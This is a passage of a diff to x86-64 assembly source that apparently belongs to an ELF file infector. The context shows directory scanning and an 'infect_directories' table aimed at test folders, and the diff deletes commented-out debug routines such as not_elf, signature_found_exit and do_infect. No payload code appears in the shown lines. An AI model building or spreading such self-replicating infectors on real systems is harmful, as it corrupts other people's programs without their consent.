@@ -183,7 +183,7 @@ _start:
     .process_file:
         lea rdi, data(dirent_array)
         add rdi, r13
-        ; d_type is the last field in the dirent struct, which has 
+        ; d_type is the last field in the dirent struct, which has
         ; a variable length due to the d_name field
         movzx edx, WORD [rdi + dirent.d_reclen]
         mov al, BYTE [rdi + rdx - 1]
@@ -285,54 +285,11 @@ get_base_address:
     ret
 ; get_base_address
 
-; error:
-;     mov rax, SYS_EXIT
-;     mov rdi, 1
-;     syscall
-; ; error
-
 exit:
     mov rax, SYS_EXIT
     xor rdi, rdi
     syscall
 ; exit
-
-; not_elf:
-;     add rsp, 16
-;     mov rax, SYS_WRITE
-;     mov rdi, 1
-;     lea rsi, [rel not_elf_msg]
-;     mov rdx, 11
-;     syscall
-
-;     jmp exit
-; ; not_elf
-
-; not_64_bit:
-;     add rsp, 16
-;     mov rax, SYS_WRITE
-;     mov rdi, 1
-;     lea rsi, [rel not_64_bit_msg]
-;     mov rdx, 17
-;     syscall
-
-;     jmp exit
-; ; not_64_bit
-
-; signature_found_exit:
-;     jmp exit
-; ; signature_found
-
-; do_infect:
-;     add rsp, 16
-;     mov rax, SYS_WRITE
-;     mov rdi, 1
-;     lea rsi, [rel do_infect_msg]
-;     mov rdx, 7
-;     syscall
-
-;     jmp exit
-; ; signature_found
 
 infect_directories:
     dq tmp_test, tmp_test2, 0
